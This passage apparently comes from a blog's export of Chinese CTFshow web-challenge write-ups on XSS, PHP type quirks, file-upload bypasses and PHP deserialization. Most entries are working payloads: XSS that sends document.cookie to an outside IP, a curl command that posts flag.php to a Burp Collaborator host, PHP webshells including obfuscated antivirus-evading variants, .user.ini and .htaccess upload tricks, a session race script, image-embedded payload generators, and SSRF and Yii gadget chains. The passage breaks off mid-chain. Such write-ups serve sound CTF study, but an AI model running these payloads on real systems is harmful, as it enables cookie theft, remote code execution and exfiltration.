onload（艹居然过滤了xss，我的域名里有xss啊啊啊啊啊啊啊啊啊啊啊）\n\n```\n<body/onload=document.location='http://20.231.29.154:5000/?cookie='+document.cookie;>\n```\n\n一直到326通杀\n\n浅总结：看这几道题来说，反射性xss无非就是变换标签，结合各种编码去绕过，空格用`\\`，关键字双写或者编码等等\n\n\n\n存储型XSS开始\n\n**327**\n\n收件人为admin，内容为XSS即可\n\n```\n<body/onload=document.location='http://20.231.29.154:5000/?cookie='+document.cookie;>\n```\n\n**328**\n\n构造js偷管理员cookie（不知道为啥我偷了登陆了也不行）\n\n![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/截屏2022-04-20 17.41.19.png)\n\n用超强模块吧\n\n```\n<sCRiPt sRC=//xss8.cc/R9YM></sCrIpT>\n```\n"},{"title":"CTFshowPHP特性","url":"/posts/47427.html","content":"\n**89**\n\n数组绕过\n\n```\nintval()用于获取变量的整数值\nintval() 函数通过使用指定的进制base转换（默认是十进制），返回变量var的integer数值。intval()不能用于object，否则会产生E_NOTICE错误并返回1。\n语法\nint intval ( mixed $var [, int $base = 10 ] )\n```\n\n**90**\n\n十六进制\n\n**91**\n\n```\nif(preg_match('/^php$/im', $a)){\n    if(preg_match('/^php$/i', $a)){\n        echo 'hacker';\n    }\n//m代表多行匹配，换行符加php即可\n//cmd=%0Aphp\n```\n\n**92**\n\n同90\n\n**93**\n\n滤了16进制，使用8进制绕过\n\n```\n?num=010574\n```\n\n**94**\n\n全等用小数绕过\n\n```\n?num=4476.01\n```\n\n**95**\n\n小数点没了，用八进制加正号绕过0过滤\n\n```\n?num=+010574\n```\n\n**96**\n\n```\n?u=./flag.php\n```\n\n**97**\n\nmd5强相等数组绕过\n\n```\na[]=1&b[]=2\n```\n\n**98**\n\n分析代码\n\n```\n3.\t$_GET?$_GET=&$_POST:'flag';\n\n    if ($_GET) {\t\t\t//只要有输入的get参数\n        $_GET = &$_POST; //就将get方法改变为post方法(修改了get方法的地址)\n        \t\t\t\t// 比如$_GET[a] = &$_POST[a]，get传a无作用，必须用POST\n    } else {\n        \"flag\";\n    }\n\n4、5行无作用\n\n6.\thighlight_file($_GET['HTTP_FLAG']=='flag'?$flag:__FILE__);\n\n    if ($_GET['HTTP_FLAG'] == 'flag') { //需要满足这个条件就可以输出flag\n        highlight_file($flag);\t\t\t//因为没有ctfshow{xxxxx}这个文件，所以会产生报错\n        \t\t\t\t\t\t\t\t//进而我们可以看到flag内容\n    } else {\n        highlight_file(__FILE__);\n    }\n构造POST\nHTTP_FLAG=flag\n再添加任意get参数即可\n```\n\n**99**\n\n```\nin_array函数如果不设置strict参数为真则进行若比较，1.php==1\npayload：n=1.php\nPOST\ncontent=一句话木马\n```\n\n**100**\n\n在PHP中，=赋值运算符优先级高于and，所以语句执行是v0=is_numeric(v1)，传入v1为数字即可\n\n```\n?v1=1&v2=var_dump($ctfshow)&v3=;\n```\n\n**101**\n\n反射类\n\n```php\n顾名思义，就是一个类的反射（废话么不是）\n下面是例子\nclass fuc { //定义一个类\n static\n function ec() {\n  echo '我是一个类';\n }\n}\n$class=new ReflectionClass('fuc'); //建立 fuc这个类的反射类\n$fuc=$class->newInstance(); //相当于实例化 fuc 类\n$fuc->ec(); //执行 fuc 里的方法ec\n$ec=$class->getmethod('ec'); //获取fuc 类中的ec方法\n$fuc=$class->newInstance(); //实例化\n$ec->invoke($fuc);   //执行ec 方法\n```\n\nPayload\n\n```\n?v1=1&v2=echo new Reflectionclass&v3=;\n```\n\n\n\n\n\n**102**\n\n```\n先转base64再转16进制完成绕过\n```\n\n**103**\n\n同上\n\n**104**\n\n没验证直接传俩一样的呗\n\n**105**\n\n```PHP\nforeach($_GET as $key => $value){\n    if($key==='error'){\n        die(\"what are you doing?!\");\n    }\n    $$key=$$value;\n}foreach($_POST as $key => $value){\n    if($value==='flag'){\n        die(\"what are you doing?!\");\n    }\n    $$key=$$value;\n}\n多种操作方法\n通过die($error)输出\npayload:a=flag \nPOST: error=a\n进行的操作为\n$a=$flag;\n$error=$a;\n\n此时$a=flag{test123};$error=flag{test123};从而输出error也就是输出flag\n通过die($suces)\npayload:suces=flag&flag=\n进行的操作为\n$suces=$flag;\n\n```\n\n**106**\n\n构造数组或弱相等绕过\n\n```\naaroZmOk\naaK1STfY\naaO8zKZF\naa3OFF9m\n```\n\n**107**\n\n```php\nparse_str函数，将字符串解析成多个变量\n$a=\"x=1&y=2\";\nparse_str($a,$b);\n此时$b['x']为1，$b['y']为2\n\npaylaod:?v3=1\nPOST\nv1=flag=c4ca4238a0b923820dcc509a6f75849b\n```\n\n**108**\n\n正则表达式%00截断，正则表达式只会匹配%00之前的内容\n\n```\nstrrev()//反转字符串\nintval()//取整数\npayload:?c=a%00778\n```\n\n**109**\n\n```php\neval(\"echo new $v1($v2());\");\n//构造使得v1名称的类存在后面任意构造即可\n```\n\n**110**\n\n```PHP\nFilesystemIterator类的使用\n$a=new FilesystemIterator(getcwd());\nwhile($a->valid()){\n  echo $a->getFilename().\"\\n\";\n  $a->next();\n}\n迭代输出当前目录下的内容\ngetcwd()//取得当前工作目录\n```\n\n**111**\n\nv1要在正则中等于ctfshow，执行的语句就是\n\n```\n$ctfshow=&$(v2的值);\nvar_dump($ctfshow);\n相当于执行了\nvar_dump($(v2的值));\n令v2=GLOBALS超全局变量即可将所有变量打印\npayload:?v1=ctfshow&v2=GLOBALS\n```\n\n**112**\n\n```\nURL二次编码，题目中把base64滤过了，对b进行二次URL编码即可，传入php时进行一次解码，调用php伪协议时再有一次\n```\n\n**113**\n\n压缩流读取\n\n```\npayload:?file=compress.zlib:///var/www/html/flag.php\n```\n\n**114**\n\n```\nphp://filter\n```\n\n**115**\n\n在数字前加上空格，也会被is_numeric函数认为是数字\n\ntrim函数会过滤空格以及`\\n\\r\\t\\v\\0`，但不会过滤`\\f`\n\n最终payload:urlencode(\"\\f\".36)\n\n**123**\n\n```\nPHP变量名应该只有数字字母下划线,同时GET或POST方式传进去的变量名,会自动将空格，+，.，[转换为_，但是当有特殊字符[时，后面的内容中就不会替换了\npayload:\nPOST:\nCTF_SHOW=1&CTF[SHOW.COM=1&fun=echo $flag\n```\n\n**125**\n\n```\nCTF_SHOW=1&CTF[SHOW.COM=1&fun=var_export(get_defined_vars())\nCTF_SHOW=1&CTF[SHOW.COM=1&fun=highlight_file($_GET[1])\n?1=flag.php\n```\n\n**126**\n\n```\n1、cli模式（命令行）下\n第一个参数$_SERVER['argv'][0]是脚本名，其余的是传递给脚本的参数\n2、web网页模式下\n在web页模式下必须在php.ini开启register_argc_argv配置项\n设置register_argc_argv = On(默认是Off)，重启服务，$_SERVER[‘argv’]才会有效果\n这时候的$_SERVER[‘argv’][0] = $_SERVER[‘QUERY_STRING’]//这里的这个参数就是GET请求中?后的内容\n$argv,$argc在web模式下不适用\n```\n\n```\npayload:?$fl0g=flag_give_me;\nCTF_SHOW=1&CTF[SHOW.COM=1&fun=eval($a[0])\n```\n\n**127**\n\n前面的自动转换咯\n\n**128**\n\n```\n小知识点： _()是一个函数\n_()==gettext() 是gettext()的拓展函数，开启text扩展。需要php扩展目录下有php_gettext.dll\nget_defined_vars()函数\nget_defined_vars — 返回由所有已定义变量所组成的数组 这样可以获得 $flag\npayload: ?f1=_&f2=get_defined_vars\n```\n\n**129**\n\n目录穿越\n\n```\npayload:?f=/ctfshow/../../../../var/www/html/flag.php \n```\n\n**130**\n\n正则/.+?ctfshow/is\n\nstripos($f, 'ctfshow') === FALSE\n\nstripos返回位置从0开始，未查找到才返回false，在严格相等中不相等\n\n直接绕\n\nf=ctfshow\n\n**131**\n\n[正则溢出](https://www.laruence.com/2010/06/08/1579.html)\n\n传个超过一百万长度的字符就好啦\n\n```\nf='kkkk'*250000+'36Dctfshow'\n#python真好用\n```\n\n**132**\n\nrobots.txt进admin\n\n对于“与”（&&） 运算： x && y 当x为false时，直接跳过，不执行y；\n\n对于“或”（||） 运算 ： x||y 当x为true时，直接跳过，不执行y。\n\n在判断这个的时候if($code === mt_rand(1,0x36D) && $password === $flag || $username ===\"admin\") 第一个$code === mt_rand(1,0x36D)为false,之后就执行|| $username ===\"admin\"\n\n后面有或，所以满足username==='admin'即可\n\n```\npayload:/admin/?code=admin&password=&username=admin\n```\n\n**133**\n\n[骚操作](https://blog.csdn.net/qq_46091464/article/details/109095382)\n\n```\n我们传递?F=`$F`;+sleep 3好像网站确实sleep了一会说明的确执行了命令\n**那为什么会这样？**\n因为是我们传递的`$F`;+sleep 3。先进行substr()函数截断然后去执行eval()函数\n这个函数的作用是执行php代码，``是shell_exec()函数的缩写，然后就去命令执行。\n而$F就是我们输入的`$F`;+sleep 3 使用最后执行的代码应该是\n`$F`;\n$F变量内容就是我们最终执行的内容\n```\n\n使用一把burp自带的功能，Burp Collaborator，相较于DNSLog的好处就是可以带出POST信息，也可以携带Cookie\n\n还有curl命令的使用\n\n```\npayload:?F=`$F`;+curl -X POST -F xx=@flag.php  http://whhi73p89wxl0oghis6zcslnue04ot.burpcollaborator.net\n```\n\n![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/截屏2022-04-09 15.18.07.png)\n\n**134**\n\nphp变量覆盖 利用点是 extract($_POST); 进行解析$_POST数组。 先将GET方法请求的解析成变量，然后在利用extract() 函数从数组中将变量导入到当前的符号表。\n\n```\npayload: ?_POST[key1]=36d&_POST[key2]=36d\n```\n\n**135**\n\n同之前或者直接mv改名\n\n```\npayload:?F=`$F`;+mv flag.php flag.txt;\n```\n\n**136**\n\nban了一堆命令，需要回显，使用Linux tee命令\n\nTee是Linux命令，用于显示程序的输出并将其复制到一个文件中。\n\n```\n命令|tee 输出文件\n```\n\n```\npayload:?c=tac /f149_15_h3r3|tee 1\n查看/1文件即可\n```\n\n**137**\n\ncall_user_func()来调用一个类里面的方法时，使用::如class::function\n\n```\npayload:\nPOST\nctfshow=ctfshow::getFlag\n```\n\n**138**\n\n调用还能传数组\n\n```\npayload:\nPOST\nctfshow[]=ctfshow&ctfshow[]=getFlag\n```\n\n**139**\n\n自动跳转我谢谢你啊\n\n我是真妹想到这玩意还能盲注\n\n```\nimport requests\nimport time\nimport string\nstr=string.digits+string.ascii_lowercase+\"-\"#获取小写字母与数字\nresult=\"\"\nkey=0\nfor j in range(1,45):\n\tprint(j)\n\tif key==1:\n\t\tbreak\n\tfor n in str:\n\t\tpayload=\"if [ `cat /f149_15_h3r3|cut -c {0}` == {1} ];then sleep 3;fi\".format(j,n)\n\t\t#print(payload)\n\t\turl=\"http://13f3a3cd-22e6-4922-a7eb-431f62263a4f.challenge.ctf.show/?c=\"+payload\n\t\ttry:\n\t\t\trequests.get(url,timeout=(2.5,2.5))\t#time()第一个参数是响应时间，第二个是读取时间\n\t\texcept:\n\t\t    result=result+n\n\t\t    print(result)\n\t\t    break\n```\n\n**140**\n\nintval把字符串转成0，0=='字符串'结果为真\n\n找俩函数返回值为字符串就行\n\n```\npayload:\nPOST\nf1=md5&f2=phpinfo\n```\n\n**141**\n\n[绕过无字母数字方法](https://blog.csdn.net/miuzzx/article/details/109143413)\n\n使用取反法\n\n```\npayload：\n?v1=1&v3=-(~%8C%86%8C%8B%9A%92)(~%8B%9E%9C%DF%99%D5);-&v2=1\n```\n\n**142**\n\n各种进制取零就行\n\n**143**\n\n过滤了取反字符，\n"},{"title":"CTFShow文件上传","url":"/posts/2824.html","content":"\n# 文件上传\n\n\n\n\n\n\n\n\n\n\n\n\n\n**151**\n\n前端校验，直接绕过\n\n**152**\n\nContent/Type校验，直接绕过\n\n**153**\n\n文件后缀名校验，尝试使用php5,phtml等文件失败，康康wp学习新知识，查看响应 头发现中间件是nginx\n\n```\nnginx中和apache的.htacess有相同作用的文件是.user.ini，进一步拓展，php中的默认配置文件实为php.ini，而php.ini有四种配置模式\n\nPHP_INI_USER\t\t\t可以在user.ini中设定\nPHP_INI_PERDIR\t\t可以在php.ini,.htacess,httpd.conf中设定\nPHP_INI_SYSTEM\t\t可以在php.ini,httpd.conf中设定\nPHP_INI_ALL\t\t\t\t随意设定\n\n并且除了php.ini文件之外，php还会从当前目录到web根目录下逐级搜索ini文件，并且在世纪操作中除了PHP_INI_SYSTEM中的内容都可以通过.user.ini进行设定\n\n那么user.ini中实际有用的配置项有两个：\nauto_append_file \t//在php4.2.3及以前是PHP_INI_ALL里面的，后面变成了PHP_INI_PERDID\nauto_prepend_file\n这两项的功能是制定一个文件包含在要执行的文件之后/之前，类似帮助原始文件添加一个require(某文件)\n```\n\n所以最终我们需要的就是将木马上传后再上传.user.ini设置包含木马即可\n\n```\n//.user.ini\nauto_prepend_file = shell.png\n//shell.png\n@eval($_POST['kkk']);\n```\n\n**154**\n\n同上题，过滤了php，大小写绕过\n\n**155**\n\n严格过滤php，所以大小写过不去了，短标签绕过\n\n```PHP\n当php参数:short_open_tag = On时，php可以解析短标签内容\nphp中常见的四种标签的写法：\n<?php echo \"CTF\"; ?>\n<? echo \"CTF\"; ?>\t\t//short_open_tag = On\n<% echo \"CTF\"; %>\t\t//这种写法在php配置中默认关闭了的，所以不能输出一行3.如果要正常输出，需要配置php.ini文件。在配置文件中找到asp_tags=off ,将off改为on。改动配置文件后需要重启apache。 \n<script language=\"php\"> echo \"CTF\"; </script>\n\n还有一种神奇写法以后会用到\n<?=(表达式)?>  等价于 <?php echo (表达式)?> //无限制  \n```\n\n**156**\n\n过滤了`[  ]`，可用`{  }`代替\n\n**157**\n\n过滤了分号和花括号，用上面的神奇写法直接执行`<?=(system('tac ../flag.???'))?>` \n\n**158**\n\n同上\n\n**159**\n\nsystem貌似没了，用`<?=nl ``../fl*``?>`\n\n**160**\n\n反引号都没了，只能尝试包含访问日志了\n\n```\n//shell.png\n<?include\"/var/lo\".\"g/nginx/access.lo\".\"g\"?>\n//空格都没给留就离谱\n//User-Agent\n<?php eval($_POST[1]);?>\n```\n\n**161**\n\n增加了对文件头的检测，其余同上\n\n**162**\n\n.和flag被过滤，session文件的竞争包含，隔壁文件包含有原因\n\n```php+HTML\n//.user.ini\nauto_prepend_file=/tmp/sess_kkk\n//1\n<?=include\"/tmp/sess_kkk\"?>\n//POC.html\n<!DOCTYPE html>\n<html>\n<body>\n<form action=\"链接\" method=\"POST\" enctype=\"multipart/form-data\">\n    <input type=\"hidden\" name=\"PHP_SESSION_UPLOAD_PROGRESS\" value=\"123\" />\n    <input type=\"file\" name=\"file\" />\n    <input type=\"submit\" value=\"submit\" />\n</form>\n</body>\n</html>\n```\n\n脚本\n\n```python\nimport requests\nimport threading\n\nsession = requests.session()\nsess = 'j1an'\nurl1 = \"http://3318481d-34f5-4d86-baa0-5bf6af29a2e9.challenge.ctf.show/\"\nurl2 = \"http://3318481d-34f5-4d86-baa0-5bf6af29a2e9.challenge.ctf.show/upload\"\ndata1 = {\n    'PHP_SESSION_UPLOAD_PROGRESS': '<?php system(\"tac ../f*\");?>'\n}\nfile = {\n    'file': 'j1an'\n}\ncookies = {\n    'PHPSESSID': sess\n}\n\n\ndef write():\n    while True:\n        r = session.post(url1, data=data1, files=file, cookies=cookies)\n\n\ndef read():\n    while True:\n        r = session.get(url2)\n        print(r.text)\n        if 'flag' in r.text:\n            print(r.text)\n\n\nthreads = [threading.Thread(target=write),\n           threading.Thread(target=read)]\nfor t in threads:\n    t.start()\n```\n\n\n\n\n\n**163**\n\n同上\n\n**164**\n\npng图片二次渲染\n\n```\n在php中包含需要渲染的代码时\n```\n\n直接用大佬脚本生成一张图片咯\n\n```PHP\n<?php\n$p = array(0xa3, 0x9f, 0x67, 0xf7, 0x0e, 0x93, 0x1b, 0x23,\n           0xbe, 0x2c, 0x8a, 0xd0, 0x80, 0xf9, 0xe1, 0xae,\n           0x22, 0xf6, 0xd9, 0x43, 0x5d, 0xfb, 0xae, 0xcc,\n           0x5a, 0x01, 0xdc, 0x5a, 0x01, 0xdc, 0xa3, 0x9f,\n           0x67, 0xa5, 0xbe, 0x5f, 0x76, 0x74, 0x5a, 0x4c,\n           0xa1, 0x3f, 0x7a, 0xbf, 0x30, 0x6b, 0x88, 0x2d,\n           0x60, 0x65, 0x7d, 0x52, 0x9d, 0xad, 0x88, 0xa1,\n           0x66, 0x44, 0x50, 0x33);\n\n\n\n$img = imagecreatetruecolor(32, 32);\n\nfor ($y = 0; $y < sizeof($p); $y += 3) {\n   $r = $p[$y];\n   $g = $p[$y+1];\n   $b = $p[$y+2];\n   $color = imagecolorallocate($img, $r, $g, $b);\n   imagesetpixel($img, round($y / 3), 0, $color);\n}\n\nimagepng($img,'kkk.png');  //要修改的图片的路径\n/*\n木马内容\n<?$_GET[0]($_POST[1]);?>\n*/\n?>\n```\n\n**165**\n\njpg图片二次渲染\n\n```php\n<?php\n    $miniPayload = \"<?php system('tac f*');?>\";\n\n\n    if(!extension_loaded('gd') || !function_exists('imagecreatefromjpeg')) {\n        die('php-gd is not installed');\n    }\n\n    if(!isset($argv[1])) {\n        die('php jpg_payload.php <jpg_name.jpg>');\n    }\n\n    set_error_handler(\"custom_error_handler\");\n\n    for($pad = 0; $pad < 1024; $pad++) {\n        $nullbytePayloadSize = $pad;\n        $dis = new DataInputStream($argv[1]);\n        $outStream = file_get_contents($argv[1]);\n        $extraBytes = 0;\n        $correctImage = TRUE;\n\n        if($dis->readShort() != 0xFFD8) {\n            die('Incorrect SOI marker');\n        }\n\n        while((!$dis->eof()) && ($dis->readByte() == 0xFF)) {\n            $marker = $dis->readByte();\n            $size = $dis->readShort() - 2;\n            $dis->skip($size);\n            if($marker === 0xDA) {\n                $startPos = $dis->seek();\n                $outStreamTmp = \n                    substr($outStream, 0, $startPos) . \n                    $miniPayload . \n                    str_repeat(\"\\0\",$nullbytePayloadSize) . \n                    substr($outStream, $startPos);\n                checkImage('_'.$argv[1], $outStreamTmp, TRUE);\n                if($extraBytes !== 0) {\n                    while((!$dis->eof())) {\n                        if($dis->readByte() === 0xFF) {\n                            if($dis->readByte !== 0x00) {\n                                break;\n                            }\n                        }\n                    }\n                    $stopPos = $dis->seek() - 2;\n                    $imageStreamSize = $stopPos - $startPos;\n                    $outStream = \n                        substr($outStream, 0, $startPos) . \n                        $miniPayload . \n                        substr(\n                            str_repeat(\"\\0\",$nullbytePayloadSize).\n                                substr($outStream, $startPos, $imageStreamSize),\n                            0,\n                            $nullbytePayloadSize+$imageStreamSize-$extraBytes) . \n                                substr($outStream, $stopPos);\n                } elseif($correctImage) {\n                    $outStream = $outStreamTmp;\n                } else {\n                    break;\n                }\n                if(checkImage('payload_'.$argv[1], $outStream)) {\n                    die('Success!');\n                } else {\n                    break;\n                }\n            }\n        }\n    }\n    unlink('payload_'.$argv[1]);\n    die('Something\\'s wrong');\n\n    function checkImage($filename, $data, $unlink = FALSE) {\n        global $correctImage;\n        file_put_contents($filename, $data);\n        $correctImage = TRUE;\n        imagecreatefromjpeg($filename);\n        if($unlink)\n            unlink($filename);\n        return $correctImage;\n    }\n\n    function custom_error_handler($errno, $errstr, $errfile, $errline) {\n        global $extraBytes, $correctImage;\n        $correctImage = FALSE;\n        if(preg_match('/(\\d+) extraneous bytes before marker/', $errstr, $m)) {\n            if(isset($m[1])) {\n                $extraBytes = (int)$m[1];\n            }\n        }\n    }\n\n    class DataInputStream {\n        private $binData;\n        private $order;\n        private $size;\n\n        public function __construct($filename, $order = false, $fromString = false) {\n            $this->binData = '';\n            $this->order = $order;\n            if(!$fromString) {\n                if(!file_exists($filename) || !is_file($filename))\n                    die('File not exists ['.$filename.']');\n                $this->binData = file_get_contents($filename);\n            } else {\n                $this->binData = $filename;\n            }\n            $this->size = strlen($this->binData);\n        }\n\n        public function seek() {\n            return ($this->size - strlen($this->binData));\n        }\n\n        public function skip($skip) {\n            $this->binData = substr($this->binData, $skip);\n        }\n\n        public function readByte() {\n            if($this->eof()) {\n                die('End Of File');\n            }\n            $byte = substr($this->binData, 0, 1);\n            $this->binData = substr($this->binData, 1);\n            return ord($byte);\n        }\n\n        public function readShort() {\n            if(strlen($this->binData) < 2) {\n                die('End Of File');\n            }\n            $short = substr($this->binData, 0, 2);\n            $this->binData = substr($this->binData, 2);\n            if($this->order) {\n                $short = (ord($short[1]) << 8) + ord($short[0]);\n            } else {\n                $short = (ord($short[0]) << 8) + ord($short[1]);\n            }\n            return $short;\n        }\n\n        public function eof() {\n            return !$this->binData||(strlen($this->binData) === 0);\n        }\n    }\n?>\n用法  php exp.php a.png\n```\n\n**166**\n\nx-zip-compressed\n\n**167**\n\n提示中为httpd，肯定与apache有关，尝试解析漏洞，上传shell.php.xxx发现执行失败，尝试上传.htaccess\n\n```\n<FilesMatch \"png\">\nSetHandler application/x-httpd-php\n</FilesMatch>\n或者\nAddType application/x-httpd-php .png   //将.png后缀的文件解析 成php\n```\n\nOK\n\n**168**\n\n构造免杀木马\n\n```\n<?php\n$a = \"s#y#s#t#e#m\";\n$b = explode(\"#\",$a);\n$c = $b[0].$b[1].$b[2].$b[3].$b[4].$b[5];\n$c($_REQUEST[1]);\n?>\n```\n\n```\n<?php\n$a=substr('1s',1).'ystem';\n$a($_REQUEST[1]);\n?>\n```\n\n```\n<?php\n$a=strrev('metsys');\n$a($_REQUEST[1]);\n?>\n```\n\n```\n<?php\n$a=$_REQUEST['a'];\n$b=$_REQUEST['b'];\n$a($b);\n?>\n```\n\n\n\n\n\n\n\n\n\n","tags":["CTF","web"]},{"title":"CTFShow反序列化","url":"/posts/17329.html","content":"\n# 反序列化\n\n序列化的概念：把一个对象转为字符串\n\n序列化的好处：\n\n1、有利于数据存储\n\n2、方便数据传递\n\n序列化后字符串的格式\n\n```\nPublic属性序列化后格式：成员名\nPrivate属性序列化后格式：%00类名%00成员名\nProtect属性序列化后格式：%00*%00成员名\n```\n\nO:对象类名长度:\"对象类名\":对象属性个数{属性名类型:属性名长度:\"属性名字\";属性类型:属性长度:\"属性内容\"}\n\n```php\nPHP序列化与反序列化方法：\n1、__construct 当一个对象被创建时调用\n2、__destruct 当一个对象被销毁时调用\n3、__toString 当一个对象被当作一个字符串时使用\n4、__sleep 在对象被序列化之前运行\n5、__wakeup 在对象被反序列化之后调用\n__construct\n// 触发条件，构造函数，当构造一个对象时调用。\n// 对象创建时销毁\n__destruct\n// 触发条件，析构函数，对象销毁时被调用。\n// 序列化时会销毁一次，对象销毁时执行，序列化输出前运行，但不影响序列化内容\n__unserialize\n// 触发条件，7.4版本以上，反序列化时出发，且可以绕过__wakeup\n__sleep\n// 在对象被序列化之前运行\n__wakeup\n// 在对象被反序列化之后被调用\n__invoke\n// 当对象被调用时执行\n// 函数形式调用对象时，触发的方法\n```\n\n\n\n**254**\n\n```\npayload:?username=xxxxx&password=xxxxx\n```\n\n按照题中全等于直接构造即可\n\n**255-257**\n\n构造就行\n\n**258**\n\n过滤了`O:数字`的形式，在冒号后加+即可，URLdecode会自动解析成连接的\n\n**259**\n\n什么玩意跳过了\n\n```php\n//flag.php\n$xff = explode(',', $_SERVER['HTTP_X_FORWARDED_FOR']);\narray_pop($xff);\n$ip = array_pop($xff);\n\nif($ip!=='127.0.0.1'){\n\tdie('error');\n}else{\n\t$token = $_POST['token'];\n\tif($token=='ctfshow'){\n\t\tfile_put_contents('flag.txt',$flag);\n\t}\n}\n\n//index.php\n<?php\n$vip = unserialize($_GET['vip']);\n//vip can get flag one key\n$vip->getFlag();\n\n```\n\n灰溜溜的回来看WP\n\n```\n如果调用一个没有定义的方法，那么就会使用类本身的call方法。由于给了个ssrf的代码，那么河里推断这是一个ssrf的原生类。\n```\n\n\n\n```PHP\n//PHP中原生类\nclass SoapClient {\n    /* Methods */\n    public __construct(?string $wsdl, array $options = [])\n    public __call(string $name, array $args): mixed\n    public __doRequest(\n        string $request,\n        string $location,\n        string $action,\n        int $version,\n        bool $oneWay = false\n    ): ?string\n    public __getCookies(): array\n    public __getFunctions(): ?array\n    public __getLastRequest(): ?string\n    public __getLastRequestHeaders(): ?string\n    public __getLastResponse(): ?string\n    public __getLastResponseHeaders(): ?string\n    public __getTypes(): ?array\n    public __setCookie(string $name, ?string $value = null): void\n    public __setLocation(?string $location = null): ?string\n    public __setSoapHeaders(SoapHeader|array|null $headers = null): bool\n    public __soapCall(\n        string $name,\n        array $args,\n        ?array $options = null,\n        SoapHeader|array|null $inputHeaders = null,\n        array &$outputHeaders = null\n    ): mixed\n}\n//可以得知构造SoapClient的类对象的时候，需要有两个参数，字符串$wsdl和数组$options\n```\n\n```php\n在构造SoapClient类时，传入数组参数为：\narray('uri'=>'http://链接','location'=>'http://链接/文件','user_agent'=>'UA头')\n该类的__call方法可构造请求使其对指定URL发起POST请求\n所以构造该类代码如下\n\n\n<?php\n   $ua=\"ctfshow\\r\\nx-forwarded-for:127.0.0.1,127.0.0.1,127.0.0.1\\r\\nContent-Type:application/x-www-form-urlencoded\\r\\nContent-Length:13\\r\\n\\r\\ntoken=ctfshow\";\n   /*相当于构造出以下请求\n   User-Agent: ctfshow\n   x-forwarded-for:127.0.0.1,127.0.0.1,127.0.0.1\n   Content-Type:application/x-www-form-urlencoded\n   Content-Length:13\n   \n   token=ctfshow\n   */\n   //由于Content-Length已经确定，所以后面该类自行构造的请求头失效\n   $s=new SoapClient(null,array('uri'=>'http://127.0.0.1/','location'=>'http://127.0.0.1/flag.php','user_agent'=>$ua));\n   echo serialize($s);\n?>\n```\n\n**260**\n\n就输入那串字符就行\n\n**261**\n\n知识点：在7.4以上版本反序列化会绕过__wakeup()函数\n\n$this->code==0x36d是弱类型比较，0x36d又有没有打引号，所以代表数字877，构造时使用877开头的文件即可，最终构造内容如下\n\n```PHP\n<?php\n   class ctfshowvip{\n      public $username=\"877.php\";\n      public $password=\"<?php eval(\\$_POST['kkk']);?>\";\n  //这里记得转译，不然会让你传入kkk参数的\n      public $code;\n   }\n   $s=new ctfshowvip();\n   echo serialize($s);\n?>\n//无语Windows Defence把我文件删了😅\n```\n\n**262**\n\n简单轻松解法：\n\n在message.php中直接构造token=admin的类\n\n困难学习解法：\n\n**263**\n\n菜狗直接wp\n\n首先看\n\n```PHP\n//index.php\n$_SESSION['limti']>5?die(\"登陆失败次数超过限制\"):$_SESSION['limit']=base64_decode($_COOKIE['limit']);\n//明显limti写错了，所以这个代码永远执行的是$_SESSION['limit']=base64_decode($_COOKIE['limit']);\n//所以我们就可以控制session中的内容\n```\n\n知识点：session在存储时有两种形式，一种是php，一种是php_serialize\n\n```PHP\n<?php\n\tclass user{\n      public $name=\"jlan\";\n      public $pass=\"123456\";\n  }\n\t$s=new user();\n\t//php存储：user|O:4:\"user\":2:{s:4:\"name\";s:4:\"jlan\";s:4:\"pass\";s:6:\"123456\";}\n\t//php_serialize存储：a:1:{s:4:\"user\";O:4:\"user\":2:{s:4:\"name\";s:4:\"jlan\";s:4:\"pass\";s:6:\"123456\";}}\n?>\n```\n\n发现诡异的点了吗，在php存储中，｜是用来分离变量名和序列化后的内容的，所以只要我们构造出序列化好的内容并且在前面加｜就可以让程序进行自动反序列化\n\n继续查看inc/inc.php\n\n```PHP\n//inc/inc.php\nclass User{\n    public $username;\n    public $password;\n    public $status;\n    function __construct($username,$password){\n        $this->username = $username;\n        $this->password = $password;\n    }\n    function setStatus($s){\n        $this->status=$s;\n    }\n    function __destruct(){\n        file_put_contents(\"log-\".$this->username, \"使用\".$this->password.\"登陆\".($this->status?\"成功\":\"失败\").\"----\".date_create()->format('Y-m-d H:i:s'));\n    }\n}\n```\n\n其中包含`file_put_contents`函数可进行一句话木马的写入\n\n最终构造如下\n\n```PHP\nclass User{\n    public $username=\"1.php\";\n    public $password=\"<?php eval(\\$_POST['kkk']);phpinfo();?>\";\n    public $status='1';\n}\n$s=new User();\necho base64_encode('|'.serialize($s));\n```\n\n首先修改cookie访问主页，然后访问/check.php使得木马文件被写入，最后访问/log-1.php即可\n\n264\n\n**265**\n\n地址传参\n\n```PHP\n<?php\nclass ctfshowAdmin{\n   public $token;\n   public $password;\n   public function __construct(){\n       $this->token='a';\n       $this->password = &$this->token;\n\t}\n}\n$a=new ctfshowAdmin();\necho serialize($a);\n?>\n```\n\n**266**\n\n匹配抛出异常后__destrurt不触发，所以使用大小写绕过即可\n\n**267**\n\nyii框架的反序列化漏洞，利用的类\n\n```PHP\nyii\\db\\BatchQueryResult\n    public function __destruct()\n    {\n        // make sure cursor is closed\n        $this->reset();\n    }\n    public function reset()\n    {\n        if ($this->_dataReader !== null) {\n            $this->_dataReader->close();\n        }\n        $this->_dataReader = null;\n        $this->_batch = null;\n        $this->_value = null;\n        $this->_key = null;\n    }\n\n这里的$this->_dataReader内容可控，可以调用不存在close方法并且存在__call方法的类，全局搜索__call方法后，发现在\nyii\\vendor\\fzaninotto\\faker\\src\\Faker\\Generator.php\n    public function __call($method, $attributes)\n    {\n        return $this->format($method, $attributes);\n    }\n跟进format\n    public function format($formatter, $arguments = array())\n    {\n        return call_user_func_array($this->getFormatter($formatter), $arguments);\n    }\n跟进getFormatter\n    public function getFormatter($formatter)\n    {\n        if (isset($this->formatters[$formatter])) {\n            return $this->formatters[$formatter];\n        }\n        foreach ($this->providers as $provider) {\n            if (method_exists($provider, $formatter)) {\n                $this->formatters[$formatter] = array($provider, $formatter);\n                return $this->formatters[$formatter];//这里会返回传入的$formatter的值\n            }\n        }\n        throw new \\InvalidArgumentException(sprintf('Unknown formatter \"%s\"', $formatter));\n    }\n发现format方法中的call_user_func_array的第一个参数可控，想要利用进而查找调用了call_user_func函数的无参方法。发现了IndexAction.php中的run方法\nyii\\rest\\IndexAction.php\n    public function run()\n    {\n        if ($this->checkAccess) {\n            call_user_func($this->checkAccess, $this->id);\n        }\n\n        return $this->prepareDataProvider();\n    }\n在run方法中checkAccess和id都可控，利用链构造成功\n```\n\n利用链\n\n`yii\\db\\BatchQueryResult::__destruct() -> Faker\\Generator::__call() -> 